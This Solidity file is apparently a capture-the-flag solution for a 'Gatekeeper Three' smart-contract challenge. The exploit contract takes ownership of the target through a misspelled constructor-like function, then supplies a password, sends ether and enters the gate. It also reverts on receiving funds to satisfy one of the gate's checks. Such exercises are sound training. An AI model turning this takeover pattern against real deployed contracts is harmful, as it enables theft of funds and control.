// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeper {
    function owner() external returns (address);
    function entrant() external returns (address);
    function allowEntrance() external returns (bool);

    function construct0r() external;
    function getAllowance(uint256) external;
    function enter() external;
}

contract SolveGatekeeperThree {
    /// errors
    error FailOnReception();

    /// storage
    IGatekeeper target;
    uint256 constant SENT_AMT = 0.00101 ether;
    address public immutable OWNER;

    constructor(address _target) payable {
        require(_target.code.length > 0, "target is not a smart contract");
        require(msg.value >= SENT_AMT);

        target = IGatekeeper(_target);
        OWNER = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == OWNER);
        _;
    }

    function solve(uint256 password) public onlyOwner {
        // call construct0r
        target.construct0r();
        require(target.owner() == address(this), "target owner is not set properly");
        require(target.owner() != tx.origin, "target owner should not be original caller");

        // get allowance
        target.getAllowance(password);
        require(target.allowEntrance(), "entrance is not allowed yet");

        // send some native balance to target
        (bool success,) = address(target).call{value: SENT_AMT}("");
        require(success, "transfer fails");

        // at the end, enter the gate
        target.enter();
        require(target.entrant() == tx.origin, "cannot enter the gate");
    }

    receive() external payable {
        revert FailOnReception();
    }
}
